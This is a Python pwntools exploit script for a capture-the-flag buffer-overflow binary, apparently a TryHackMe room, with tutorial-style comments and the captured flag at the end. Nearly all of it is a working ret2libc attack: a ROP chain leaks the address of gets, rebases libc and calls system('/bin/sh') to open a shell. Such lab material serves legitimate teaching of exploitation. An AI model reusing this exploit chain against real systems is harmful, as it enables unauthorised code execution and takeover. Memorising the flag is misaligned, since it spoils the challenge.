#!/usr/bin/env python3

from pwn import *

exe = './exploit_me'
elf = context.binary = ELF(exe,checksec=False)
context.log_level = 'debug'

io = process(exe)

rop = ROP(elf)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # ldd exploit_me

p = process()

padding = 18
# p64 : Returns the byte string from the data passed in the argument
payload = asm('nop')*padding
payload += p64(rop.find_gadget(['pop rdi','ret'])[0]) # Returns an array of all addresses in memory where the instructions ['pop rdi', 'ret'] occur, and since we only need the first one, we specify [0] for the first value in the array.
payload += p64(elf.got.gets) # Returns the address of the gets functions from the .got.plt section
payload += p64(elf.plt.puts) # Returns the address of the puts function from the .plt section.
payload += p64(elf.symbols.main) # Return address of puts function to main function so that program dosent restart and Libc base address dosent change again because ASLR is on 

p.recvline()
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b'\0'))# u64() : So with this function, we're unpacking the byte string. But here comes one little problem, which is solved by the next function.
#One issue here is that the u64() function cannot unpack a byte string that isn't precisely 64 bits long (=8 bytes). Since our address doesn't come in this size, padding is required.
#This padding is done by adding additional null bytes (before we unpack it) to the beginning of the string so that we have a byte string that is exactly 64 bits (=8 bytes) long.
#The first argument is the final length of the byte string. In our case, it's 8.
#The second argument is the byte that is being prefixed until the byte string is exactly 8 bytes long. In our case, it's the null byte
# strip () : At the end of our byte string is the new line character \n, which we want to get rid of, and the strip function does exactly that
p.recvline()

log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')

payload = padding * asm('nop')
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh'))) # next : Function returns the "next" iterator from the founded matches.
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

#    Returns the address of the system function inside of our linked libc.
#    Since we initially defined the libc variable as an ELF object and later rebased this libc with our first ROP chain, we can now call the system function right from the libc.

p.sendline(payload)
p.recvline()
p.interactive()
# flag : thm{dGhlIG1vc3QgcmFuZG9tIHZhbHVlIHlvdSBjb3VsZCBldmVyIGd1ZXNz}
